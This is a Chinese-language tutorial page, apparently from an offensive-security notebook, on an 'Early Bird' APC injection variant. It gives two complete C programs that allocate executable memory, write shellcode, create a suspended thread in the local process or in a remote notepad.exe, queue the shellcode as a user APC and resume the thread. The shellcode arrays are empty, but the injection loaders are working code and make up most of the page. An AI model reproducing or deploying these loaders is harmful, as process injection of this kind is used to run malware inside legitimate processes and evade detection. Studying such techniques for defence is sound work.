# Early Bird & CreateThread or CreateRemoteThread

在前面的[Early Bird](early-bird.md)篇我们知道，在恢复挂起线程时程序会调用NtTestAlert函数对APC队列进行处理，试想，我们在进程内创建一个挂起的线程，然后往这个线程内插入用户apc，随后恢复进程，是不是同样可以在进程执行入口点前接管进程?

![](../.gitbook/assets/image%20%2850%29.png)

## 实现思路

1. 创建一个挂起的线程
2. 写入shellcode
3. 插入apc队列
4. 恢复线程

## 代码实现

由于进程会在入口点执行前被接管，所以我们其实并不用指向一个真正有效的入口点。

* 本进程代码执行:

```text
#include<Windows.h>
#include<stdio.h>

char shellcode[] = 
"";

int main() {

	HANDLE hThread = NULL;
	HANDLE hProcess = 0;
	DWORD ProcessId = 0;
	LPVOID AllocAddr = NULL;


	hProcess = GetCurrentProcess();
	AllocAddr = VirtualAllocEx(hProcess, 0, sizeof(shellcode) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, AllocAddr, shellcode, sizeof(shellcode) + 1, 0);


	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);

	QueueUserAPC((PAPCFUNC)AllocAddr, hThread, 0);
	ResumeThread(hThread);
	WaitForSingleObject(hThread,INFINITE);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return 0;

}
```

* 远程线程注入:

```text
#include<Windows.h>
#include<stdio.h>

char shellcode[] = 
"";

int main() {

	HANDLE hThread = NULL;
	HANDLE hProcess = 0;
	DWORD ProcessId = 0;
	LPVOID AllocAddr = NULL;


	//hProcess = GetCurrentProcess();
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, 12524);//notepad.exe
	AllocAddr = VirtualAllocEx(hProcess, 0, sizeof(shellcode) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, AllocAddr, shellcode, sizeof(shellcode) + 1, 0);


	hThread = CreateRemoteThread(hProcess,0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);

	QueueUserAPC((PAPCFUNC)AllocAddr, hThread, 0);
	ResumeThread(hThread);
	//WaitForSingleObject(hThread,INFINITE);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return 0;

}
```

![](../.gitbook/assets/image%20%2824%29.png)

## 待解决问题

由于未指定有效的线程入口点,在apc执行结束后，进程会崩溃退出。

可以用指定一个dll入口点解决。

